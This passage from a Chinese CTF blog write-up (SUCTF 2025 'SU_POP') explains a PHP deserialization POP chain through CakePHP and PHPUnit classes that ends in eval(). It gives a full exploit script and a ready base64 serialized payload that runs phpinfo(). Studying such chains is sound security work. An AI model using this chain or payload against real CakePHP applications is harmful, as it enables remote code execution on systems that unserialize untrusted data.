<li><p><strong>对象销毁</strong>: RejectedPromise对象被销毁，触发 <code>__destruct()</code></p>
</li>
</ol>
<ol start="3">
<li><p><strong>字符串转换</strong>: 在 <code>__destruct()</code>中，Response对象被转换为字符串，触发 <code>__toString()</code></p>
</li>
<li><p><strong>方法调用</strong>: 在 <code>__toString()</code>中，调用Table对象的方法，触发 <code>__call()</code></p>
</li>
</ol>
<ol start="5">
<li><p><strong>行为调用</strong>: 在 <code>__call()</code>中，调用BehaviorRegistry的 <code>call()</code>方法</p>
</li>
<li><p><strong>代码执行</strong>: 在 <code>call()</code>中，调用MockClass的 <code>generate()</code>方法</p>
</li>
</ol>
<ol start="7">
<li><strong>RCE</strong>: 在 <code>generate()</code>中，执行 <code>eval($this-&gt;classCode)</code>，实现远程代码执行</li>
</ol>
<h2 id="关键技巧"><a href="#关键技巧" class="headerlink" title="关键技巧"></a>关键技巧</h2><h3 id="1-对象链构造"><a href="#1-对象链构造" class="headerlink" title="1. 对象链构造"></a>1. 对象链构造</h3><ul>
<li><p>每个对象都包含下一个攻击目标</p>
</li>
<li><p>利用PHP的魔术方法自动触发</p>
</li>
</ul>
<h3 id="2-参数控制"><a href="#2-参数控制" class="headerlink" title="2. 参数控制"></a>2. 参数控制</h3><ul>
<li><p>通过对象属性控制方法参数</p>
</li>
<li><p>利用数组索引控制方法调用</p>
</li>
</ul>
<h3 id="3-条件绕过"><a href="#3-条件绕过" class="headerlink" title="3. 条件绕过"></a>3. 条件绕过</h3><ul>
<li><p>确保每个条件检查都返回true</p>
</li>
<li><p>利用默认值和空数组绕过限制</p>
</li>
</ul>
<h3 id="4-类加载"><a href="#4-类加载" class="headerlink" title="4. 类加载"></a>4. 类加载</h3><ul>
<li><p>利用不存在的类名触发 <code>eval()</code></p>
</li>
<li><p>避免类名冲突</p>
</li>
</ul>
<h2 id="Questions"><a href="#Questions" class="headerlink" title="Questions"></a>Questions</h2><h2 id="1-为什么-message-Unhandled-promise-rejection-with-this-reason-这里要想到调用Response-toString"><a href="#1-为什么-message-Unhandled-promise-rejection-with-this-reason-这里要想到调用Response-toString" class="headerlink" title="1. 为什么$message = &#39;Unhandled promise rejection with &#39; . $this-&gt;reason;这里要想到调用Response::__toString"></a>1. 为什么<code>$message = &#39;Unhandled promise rejection with &#39; . $this-&gt;reason;</code>这里要想到调用Response::__toString</h2><p>让我先查看RejectedPromise的__destruct方法：</p>
<p><strong>详细解释</strong>：</p>
<p>这里的关键在于第40行：<code>$message = &#39;Unhandled promise rejection with &#39; . $this-&gt;reason;</code></p>
<p>当PHP执行字符串连接操作时，如果<code>$this-&gt;reason</code>是一个对象，PHP会自动调用该对象的<code>__toString()</code>方法将对象转换为字符串。</p>
<p><strong>具体过程</strong>：</p>
<ol>
<li><p><code>$this-&gt;reason</code>被设置为一个Response对象</p>
</li>
<li><p>当执行字符串连接<code>&#39;Unhandled promise rejection with &#39; . $this-&gt;reason</code>时</p>
</li>
</ol>
<ol start="3">
<li><p>PHP检测到<code>$this-&gt;reason</code>是对象，自动调用<code>Response::__toString()</code></p>
</li>
<li><p>这样就触发了Response对象的<code>__toString()</code>方法</p>
</li>
</ol>
<p><strong>为什么选择Response对象</strong>：</p>
<ul>
<li><p>Response类实现了<code>Stringable</code>接口，有<code>__toString()</code>方法</p>
</li>
<li><p>在<code>__toString()</code>中会调用<code>$this-&gt;stream</code>的方法</p>
</li>
<li><p>可以进一步控制调用链</p>
</li>
</ul>
<h2 id="2-将Response对象设置为RejectedPromise的reason之后，怎么就能调用-toString"><a href="#2-将Response对象设置为RejectedPromise的reason之后，怎么就能调用-toString" class="headerlink" title="2. 将Response对象设置为RejectedPromise的reason之后，怎么就能调用__toString"></a>2. 将Response对象设置为RejectedPromise的reason之后，怎么就能调用__toString</h2><p>让我查看Response类的__toString方法：</p>
<p><strong>详细解释</strong>：</p>
<p>当Response对象被转换为字符串时，PHP会自动调用<code>__toString()</code>方法。这个过程发生在：</p>
<ol>
<li><p><strong>字符串连接时</strong>：<code>&#39;text&#39; . $responseObject</code></p>
</li>
<li><p><strong>echo输出时</strong>：<code>echo $responseObject</code></p>
</li>
</ol>
<ol start="3">
<li><p><strong>字符串拼接时</strong>：<code>sprintf(&#39;%s&#39;, $responseObject)</code></p>
</li>
<li><p><strong>类型转换时</strong>：<code>(string)$responseObject</code></p>
</li>
</ol>
<p><strong>在攻击链中的触发</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在RejectedPromise::__destruct()中</span></span><br><span class="line"><span class="variable">$message</span> = <span class="string">&#x27;Unhandled promise rejection with &#x27;</span> . <span class="variable language_">$this</span>-&gt;reason;</span><br><span class="line"><span class="comment">//                                                      ↑</span></span><br><span class="line"><span class="comment">//                                              这里触发__toString()</span></span><br></pre></td></tr></table></figure>

<p><strong>Response::__toString()的执行</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;stream-&gt;<span class="title function_ invoke__">rewind</span>();        <span class="comment">// 调用stream对象的rewind方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;stream-&gt;<span class="title function_ invoke__">getContents</span>();  <span class="comment">// 调用stream对象的getContents方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里<code>$this-&gt;stream</code>被设置为Table对象，所以会调用Table对象的方法。</p>
<h2 id="3-当调用Table对象上不存在的方法时，-call-方法被触发，这句话怎么理解？"><a href="#3-当调用Table对象上不存在的方法时，-call-方法被触发，这句话怎么理解？" class="headerlink" title="3. 当调用Table对象上不存在的方法时，__call()方法被触发，这句话怎么理解？"></a>3. 当调用Table对象上不存在的方法时，<code>__call()</code>方法被触发，这句话怎么理解？</h2><p>让我查看Table类的__call方法：</p>
<p><strong>详细解释</strong>：</p>
<p>在Response::__toString()中，调用了<code>$this-&gt;stream-&gt;rewind()</code>和<code>$this-&gt;stream-&gt;getContents()</code>。</p>
<p><strong>具体过程</strong>：</p>
<ol>
<li><p><code>$this-&gt;stream</code>被设置为Table对象</p>
</li>
<li><p>调用<code>$this-&gt;stream-&gt;rewind()</code>，即<code>$table-&gt;rewind()</code></p>
</li>
</ol>
<ol start="3">
<li><p>Table类没有<code>rewind()</code>方法</p>
</li>
<li><p>PHP自动调用<code>Table::__call(&#39;rewind&#39;, [])</code></p>
</li>
</ol>
<ol start="5">
<li><p>同样，调用<code>$this-&gt;stream-&gt;getContents()</code>，即<code>$table-&gt;getContents()</code></p>
</li>
<li><p>Table类没有<code>getContents()</code>方法</p>
</li>
</ol>
<ol start="7">
<li>PHP自动调用<code>Table::__call(&#39;getContents&#39;, [])</code></li>
</ol>
<p><strong>__call()的触发条件</strong>：</p>
<ul>
<li><p>当调用对象上不存在的方法时</p>
</li>
<li><p>PHP会自动调用该对象的<code>__call()</code>方法</p>
</li>
<li><p>传入参数：方法名和参数数组</p>
</li>
</ul>
<p><strong>在攻击链中</strong>：</p>
<ul>
<li><p>方法名：<code>&#39;rewind&#39;</code>或<code>&#39;getContents&#39;</code></p>
</li>
<li><p>参数：<code>[]</code>（空数组）</p>
</li>
<li><p>这些方法在Table类中都不存在，所以触发<code>__call()</code></p>
</li>
</ul>
<h2 id="4-为什么调用完Table-call-之后还要去调用BehaviorRegistry-call"><a href="#4-为什么调用完Table-call-之后还要去调用BehaviorRegistry-call" class="headerlink" title="4. 为什么调用完Table::__call()之后还要去调用BehaviorRegistry::call()"></a>4. 为什么调用完Table::__call()之后还要去调用BehaviorRegistry::call()</h2><p>让我查看Table::__call()的具体实现：</p>
<p><strong>详细解释</strong>：</p>
<p>在Table::__call()中：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$method</span>, <span class="keyword">array</span> <span class="variable">$args</span></span>): <span class="title">mixed</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;_behaviors-&gt;<span class="title function_ invoke__">hasMethod</span>(<span class="variable">$method</span>)) &#123;  <span class="comment">// 检查behaviors是否有这个方法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_behaviors-&gt;<span class="title function_ invoke__">call</span>(<span class="variable">$method</span>, <span class="variable">$args</span>);  <span class="comment">// 调用behaviors的call方法</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>调用流程</strong>：</p>
<ol>
<li><p><code>$table-&gt;rewind()</code>触发<code>Table::__call(&#39;rewind&#39;, [])</code></p>
</li>
<li><p>检查<code>$this-&gt;_behaviors-&gt;hasMethod(&#39;rewind&#39;)</code></p>
</li>
</ol>
<ol start="3">
<li><p>如果返回true，调用<code>$this-&gt;_behaviors-&gt;call(&#39;rewind&#39;, [])</code></p>
</li>
<li><p><code>$this-&gt;_behaviors</code>是BehaviorRegistry对象</p>
</li>
</ol>
<ol start="5">
<li>所以会调用<code>BehaviorRegistry::call(&#39;rewind&#39;, [])</code></li>
</ol>
<p><strong>为什么需要BehaviorRegistry</strong>：</p>
<ul>
<li><p>Table类本身没有<code>rewind()</code>方法</p>
</li>
<li><p>但Table类支持通过behaviors扩展功能</p>
</li>
<li><p><code>__call()</code>方法会检查behaviors是否有对应的方法</p>
</li>
<li><p>如果有，就委托给behaviors处理</p>
</li>
</ul>
<p><strong>攻击者的控制</strong>：</p>
<ul>
<li><p>可以控制<code>$this-&gt;_behaviors</code>为任意对象</p>
</li>
<li><p>可以控制<code>hasMethod()</code>的返回值</p>
</li>
<li><p>可以控制<code>call()</code>方法的执行</p>
</li>
</ul>
<h2 id="5-MockClass-generate-和前面的链是什么关系，为什么不直接调用它"><a href="#5-MockClass-generate-和前面的链是什么关系，为什么不直接调用它" class="headerlink" title="5. MockClass::generate()和前面的链是什么关系，为什么不直接调用它"></a>5. MockClass::generate()和前面的链是什么关系，为什么不直接调用它</h2><p>让我查看BehaviorRegistry::call()的实现：</p>
<p><strong>详细解释</strong>：</p>
<p><strong>为什么不能直接调用MockClass::generate()</strong>：</p>
<ol>
<li><p><strong>访问限制</strong>：MockClass::generate()不是公开的API，不能直接调用</p>
</li>
<li><p><strong>参数要求</strong>：需要正确的参数和对象状态</p>
</li>
</ol>
<ol start="3">
<li><strong>权限控制</strong>：可能有权限检查</li>
</ol>
<p><strong>通过攻击链调用的优势</strong>：</p>
<ol>
<li><p><strong>绕过限制</strong>：通过正常的对象方法调用链</p>
</li>
<li><p><strong>参数控制</strong>：可以控制传入的参数</p>
</li>
</ol>
<ol start="3">
<li><strong>隐蔽性</strong>：看起来像正常的框架调用</li>
</ol>
<p><strong>在BehaviorRegistry::call()中的关键代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$method</span>, <span class="keyword">array</span> <span class="variable">$args</span> = []</span>): <span class="title">mixed</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$method</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$method</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">hasMethod</span>(<span class="variable">$method</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$this</span>-&gt;_methodMap[<span class="variable">$method</span>][<span class="number">0</span>])) &#123;</span><br><span class="line">        [<span class="variable">$behavior</span>, <span class="variable">$callMethod</span>] = <span class="variable language_">$this</span>-&gt;_methodMap[<span class="variable">$method</span>];  <span class="comment">// 从映射表获取行为和方法名</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_loaded[<span class="variable">$behavior</span>]-&gt;&#123;<span class="variable">$callMethod</span>&#125;(...<span class="variable">$args</span>);  <span class="comment">// 调用对应的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>攻击者的控制</strong>：</p>
<ul>
<li><p><code>$this-&gt;_methodMap[&#39;rewind&#39;] = [&#39;mock&#39;, &#39;generate&#39;]</code></p>
</li>
<li><p><code>$this-&gt;_loaded[&#39;mock&#39;] = $mockClassObject</code></p>
</li>
<li><p>当调用<code>rewind</code>时，实际调用<code>$mockClassObject-&gt;generate()</code></p>
</li>
</ul>
<p><strong>完整的调用链</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Table::__call(&#x27;rewind&#x27;, [])</span><br><span class="line">    ↓</span><br><span class="line">BehaviorRegistry::call(&#x27;rewind&#x27;, [])</span><br><span class="line">    ↓</span><br><span class="line">$this-&gt;_methodMap[&#x27;rewind&#x27;] = [&#x27;mock&#x27;, &#x27;generate&#x27;]</span><br><span class="line">    ↓</span><br><span class="line">$this-&gt;_loaded[&#x27;mock&#x27;]-&gt;generate()</span><br><span class="line">    ↓</span><br><span class="line">MockClass::generate()</span><br><span class="line">    ↓</span><br><span class="line">eval($this-&gt;classCode)</span><br></pre></td></tr></table></figure>



<p><strong>为什么不直接调用</strong>：</p>
<ol>
<li><p><strong>框架设计</strong>：这是框架的正常调用机制</p>
</li>
<li><p><strong>参数传递</strong>：通过框架传递参数更安全</p>
</li>
</ol>
<ol start="3">
<li><p><strong>错误处理</strong>：框架会处理各种异常情况</p>
</li>
<li><p><strong>隐蔽性</strong>：看起来像正常的业务逻辑调用</p>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个攻击链的精妙之处在于：</p>
<ol>
<li><p><strong>利用PHP的魔术方法</strong>：<code>__destruct()</code>, <code>__toString()</code>, <code>__call()</code></p>
</li>
<li><p><strong>利用框架的设计模式</strong>：行为模式、委托模式</p>
</li>
</ol>
<ol start="3">
<li><p><strong>利用字符串操作</strong>：自动触发<code>__toString()</code></p>
</li>
<li><p><strong>利用方法委托</strong>：通过<code>__call()</code>委托给其他对象</p>
</li>
</ol>
<ol start="5">
<li><strong>利用映射机制</strong>：通过映射表控制方法调用</li>
</ol>
<p>每个环节都是必要的，缺少任何一个环节都无法完成攻击。这就是为什么这个攻击链如此精妙和难以发现的原因。</p>
<p>Exp</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace React\Promise\Internal;</span><br><span class="line">use Cake\Http\Response;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">RejectedPromise</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $reason ;</span><br><span class="line">    <span class="type">private</span> <span class="variable">$handled</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__construct</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;reason = <span class="keyword">new</span> <span class="title class_">Response</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Cake\Http;</span><br><span class="line">use Cake\ORM\Table;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Response</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> $stream;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__construct</span><span class="params">()</span>&#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;stream = <span class="keyword">new</span> <span class="title class_">Table</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//public function __toString(): string</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//    $this-&gt;stream-&gt;rewind();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    return $this-&gt;stream-&gt;getContents();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line">namespace Cake\ORM;</span><br><span class="line">use PHPUnit\Framework\MockObject\Generator\MockClass;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Table</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> BehaviorRegistry $_behaviors;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__construct</span><span class="params">()</span>&#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;_behaviors = <span class="keyword">new</span> <span class="title class_">BehaviorRegistry</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ObjectRegistry</span>&#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BehaviorRegistry</span> <span class="keyword">extends</span> <span class="title class_">ObjectRegistry</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> array $_methodMap;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">array</span> <span class="variable">$_loaded</span> <span class="operator">=</span> [];</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__construct</span><span class="params">()</span>&#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;_methodMap = [<span class="string">&#x27;rewind&#x27;</span> =&gt; array(<span class="string">&#x27;aaa&#x27;</span>, <span class="string">&#x27;generate&#x27;</span>)];</span><br><span class="line">        $<span class="built_in">this</span>-&gt;_loaded = [<span class="string">&#x27;aaa&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">MockClass</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace PHPUnit\Framework\MockObject\Generator;</span><br><span class="line"></span><br><span class="line">use function call_user_func;</span><br><span class="line">use function class_exists;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">MockClass</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> readonly string $classCode;</span><br><span class="line">    <span class="keyword">private</span> readonly string $mockName ;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__construct</span><span class="params">()</span>&#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;mockName = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;classCode = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace React\Promise\Internal;</span><br><span class="line">$a = <span class="keyword">new</span> <span class="title class_">RejectedPromise</span>();</span><br><span class="line">echo <span class="number">11111</span>;</span><br><span class="line">echo <span class="title function_">base64_encode</span><span class="params">(serialize($a)</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzozODoiUmVhY3RcUHJvbWlzZVxJbnRlcm5hbFxSZWplY3RlZFByb21pc2UiOjI6e3M6NDY6IgBSZWFjdFxQcm9taXNlXEludGVybmFsXFJlamVjdGVkUHJvbWlzZQByZWFzb24iO086MTg6IkNha2VcSHR0cFxSZXNwb25zZSI6MTp7czoyNjoiAENha2VcSHR0cFxSZXNwb25zZQBzdHJlYW0iO086MTQ6IkNha2VcT1JNXFRhYmxlIjoxOntzOjEzOiIAKgBfYmVoYXZpb3JzIjtPOjI1OiJDYWtlXE9STVxCZWhhdmlvclJlZ2lzdHJ5IjoyOntzOjEzOiIAKgBfbWV0aG9kTWFwIjthOjE6e3M6NjoicmV3aW5kIjthOjI6e2k6MDtzOjM6ImFhYSI7aToxO3M6ODoiZ2VuZXJhdGUiO319czoxMDoiACoAX2xvYWRlZCI7YToxOntzOjM6ImFhYSI7Tzo0ODoiUEhQVW5pdFxGcmFtZXdvcmtcTW9ja09iamVjdFxHZW5lcmF0b3JcTW9ja0NsYXNzIjoyOntzOjU5OiIAUEhQVW5pdFxGcmFtZXdvcmtcTW9ja09iamVjdFxHZW5lcmF0b3JcTW9ja0NsYXNzAGNsYXNzQ29kZSI7czoxMDoicGhwaW5mbygpOyI7czo1ODoiAFBIUFVuaXRcRnJhbWV3b3JrXE1vY2tPYmplY3RcR2VuZXJhdG9yXE1vY2tDbGFzcwBtb2NrTmFtZSI7czozOiJhYWEiO319fX19czo0NzoiAFJlYWN0XFByb21pc2VcSW50ZXJuYWxcUmVqZWN0ZWRQcm9taXNlAGhhbmRsZWQiO2I6MDt9</span><br></pre></td></tr></table></figure>

<h2 id="Reference-x20"><a href="#Reference-x20" class="headerlink" title="Reference&#x20;"></a>Reference&#x20;</h2><p><a target="_blank" rel="noopener" href="https://infernity.top/2025/01/14/SUCTF2025/">https://infernity.top/2025/01/14/SUCTF2025/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.s1um4i.com/2025-SUCTF/">https://blog.s1um4i.com/2025-SUCTF/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/team-su/SUCTF-2025/tree/master/web/SU/_POP/writeuphttps://blog.0xfff.team/posts/suctf/_2025/_writeup/#su\_pop">https://github.com/team-su/SUCTF-2025/tree/master/web/SU\_POP/writeuphttps://blog.0xfff.team/posts/suctf\_2025\_writeup/#su\_pop</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/9446#toc-7">https://xz.aliyun.com/news/9446#toc-7</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://sebastian-alphax.github.io">Abernethy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://sebastian-alphax.github.io/2025/09/12/SUCTF/">https://sebastian-alphax.github.io/2025/09/12/SUCTF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post-share"><div class="social-share" data-image="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/263e5fe7c7bc4d83879090fd5082e7a9.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/09/12/TFCCTF/" title="TFCCTF"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1757651713578.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">TFCCTF</div></div><div class="info-2"><div class="info-item-1">KISSFIXESS &amp; KISSFIXESS_REVENGEKISSFIXESS12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611711811912012112212312412512612712812913013113213313413513613713813914014114214314414514614714814915015115215315415515615715815916016116216316416516616716816917017117217317417517617717817918018118218318418518618...</div></div></div></a><a class="pagination-related" href="/2025/09/01/LACTF_2025_arclbroth/" title="LACTF_2025_arclbroth"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/image%20(2).png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">LACTF_2025_arclbroth</div></div><div class="info-2"><div class="info-item-1">LACTF_2025_arclbrotharclbroth | CLOSED | working :123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145// 导入所需的模块const crypto = require(&#x27;crypto&#x27;);const path = require(&#x27;path&#x27;);const express = require(&#x2...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/08/28/JAVA%E5%8F%8D%E5%B0%84/" title="深入理解Java反射机制：动态操作类的强大工具"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/2853232508930053.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-28</div><div class="info-item-2">深入理解Java反射机制：动态操作类的强大工具</div></div><div class="info-2"><div class="info-item-1">深入理解Java反射机制：动态操作类的强大工具什么是反射？Java反射是一种强大的机制，允许程序在运行时动态获取类的信息并对其进行操作。通过反射，我们可以在编译时不需要知道具体类的情况下，运行时获取类的字段、方法、构造函数等信息，并能够动态调用方法、创建实例和访问字段。这种能力使得Java程序具备了更高的灵活性和动态性。 反射的核心类Java反射机制主要由以下几个位于java.lang.reflect包中的核心类组成：  Class类：表示类或接口，是反射操作的入口点 Field类：表示类的字段（成员变量） Method类：表示类的方法 Constructor类：表示类的构造函数  反射实战：通过示例学习让我们通过一个具体的例子来理解反射的各个操作环节： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import java.lang.reflect.*;public class ReflectionExample &#123;    public...</div></div></div></a><a class="pagination-related" href="/2025/09/01/LACTF_2025_arclbroth/" title="LACTF_2025_arclbroth"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/image%20(2).png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-01</div><div class="info-item-2">LACTF_2025_arclbroth</div></div><div class="info-2"><div class="info-item-1">LACTF_2025_arclbrotharclbroth | CLOSED | working :123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145// 导入所需的模块const crypto = require(&#x27;crypto&#x27;);const path = require(&#x27;path&#x27;);const express = require(&#x2...</div></div></div></a><a class="pagination-related" href="/2025/07/19/LZCTF2025/" title="LZCTF2025"><img class="cover" src="/2025/07/19/LZCTF2025/PixPin_2025-07-19_12-22-54.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-19</div><div class="info-item-2">LZCTF2025</div></div><div class="info-2"><div class="info-item-1">WEBXX二把嗦 